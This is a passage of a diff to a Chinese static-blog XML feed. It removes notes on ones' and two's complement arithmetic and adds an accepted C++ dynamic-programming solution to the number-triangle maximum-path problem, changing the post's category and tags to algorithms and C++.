class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>大一课程</category>
+        <category>算法</category>
       </categories>
       <tags>
-        <tag>计算机原理</tag>
+        <tag>C++</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
